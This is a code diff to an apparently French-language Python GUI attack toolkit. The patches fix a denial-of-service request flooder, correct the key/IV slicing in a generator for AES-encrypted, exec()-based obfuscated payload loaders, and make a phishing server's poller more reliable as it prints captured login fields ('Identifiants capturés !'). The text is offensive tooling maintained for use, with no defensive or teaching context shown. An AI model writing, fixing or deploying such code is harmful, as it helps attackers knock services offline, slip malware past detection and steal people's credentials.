@@ -812,6 +812,11 @@ class WebTab(BaseTab):
         import ssl
         host = url.split("//")[-1].split("/")[0].split(":")[0]
         port = 443
+        if ":" in url.split("//")[-1].split("/")[0]:
+            try:
+                port = int(url.split("//")[-1].split("/")[0].split(":")[1])
+            except:
+                pass
         self.log(self.output, f"Analyse SSL pour {host}:{port}...", "bold")
         try:
             ctx = ssl.create_default_context()
@@ -832,8 +837,7 @@ class WebTab(BaseTab):
                         self.log(self.output, f"  \u26a0 Expire dans {days} jours", "warning")
                     else:
                         self.log(self.output, f"  \u2713 Valide encore {days} jours", "success")
-                    sans = dict(cert['subjectAltName'][0]) if 'subjectAltName' in cert else {}
-                    if sans:
+                    if 'subjectAltName' in cert:
                         self.log(self.output, f"  SAN: {cert['subjectAltName'][:5]}")
         except Exception as e:
             self.log(self.output, f"  Erreur SSL: {e}", "error")
@@ -1312,12 +1316,14 @@ class DoSTab(BaseTab):
             messagebox.showwarning("Attention", "Entrez une URL.")
             return
         if not url.startswith("http"):
-            url = "http://" + url
+            if ":443" in url or "https" in url.lower():
+                url = "https://" + url
+            else:
+                url = "http://" + url
             self.entry_url.delete(0, tk.END)
             self.entry_url.insert(0, url)
 
         self.clear(self.output)
-        self.running = True
         self.stop_flag.clear()
         self.btn_start.config(state=tk.DISABLED)
         self.btn_stop.config(state=tk.NORMAL)
@@ -1342,11 +1348,9 @@ class DoSTab(BaseTab):
                     with lock:
                         stats["errors"] += 1
 
-        threads = []
         for _ in range(n_threads):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
-            threads.append(t)
 
         while not self.stop_flag.is_set():
             time.sleep(2)
@@ -1359,7 +1363,6 @@ class DoSTab(BaseTab):
         self.log(self.output, f"Total: {stats['sent']} requ\u00eates, {stats['errors']} erreurs")
 
     def stop_dos(self):
-        self.running = False
         self.stop_flag.set()
         self.btn_start.config(state=tk.NORMAL)
         self.btn_stop.config(state=tk.DISABLED)
@@ -2152,9 +2155,9 @@ class ExploitTab(BaseTab):
                 f'from Crypto.Cipher import AES\n'
                 f'import base64,os\n'
                 f'key=base64.b64decode("{encoded[:44]}")\n'
-                f'iv=base64.b64decode("{encoded[44:88]}")\n'
+                f'iv=base64.b64decode("{encoded[44:68]}")\n'
                 f'c=AES.new(key,AES.MODE_CBC,iv)\n'
-                f'exec(c.decrypt(base64.b64decode("{encoded[88:]}")).decode())\n'
+                f'exec(c.decrypt(base64.b64decode("{encoded[68:]}")).decode())\n'
             )
         elif method == "split":
             parts = encoded.split(":")
@@ -2569,6 +2572,7 @@ class PhishingServer:
     def stop(self):
         if self.server:
             self.server.shutdown()
+            self.server.server_close()
 
     def get_captured(self):
         if self.server:
@@ -2664,22 +2668,26 @@ class PhishingTab(BaseTab):
 
     def _poll_captured(self):
         seen = set()
-        while self.server and self.server.server:
+        srv = self.server
+        while srv and srv.server:
             time.sleep(1)
-            for item in self.server.get_captured():
-                if item not in seen:
-                    seen.add(item)
-                    parts = item.split("&")
-                    self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
-                    for p in parts:
-                        if "=" in p:
-                            k, v = p.split("=", 1)
-                            from urllib.parse import unquote
-                            v = unquote(v)
-                            self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
-                    self.log_text.insert(tk.END, "-" * 50 + "\n")
-                    self.log_text.see(tk.END)
-                    self.log(self.output, f"Identifiants captur\u00e9s !", "success")
+            try:
+                for item in srv.get_captured():
+                    if item not in seen:
+                        seen.add(item)
+                        parts = item.split("&")
+                        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
+                        for p in parts:
+                            if "=" in p:
+                                k, v = p.split("=", 1)
+                                from urllib.parse import unquote
+                                v = unquote(v)
+                                self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
+                        self.log_text.insert(tk.END, "-" * 50 + "\n")
+                        self.log_text.see(tk.END)
+                        self.log(self.output, f"Identifiants captur\u00e9s !", "success")
+            except:
+                break
 
     def _get_local_ip(self):
         try:
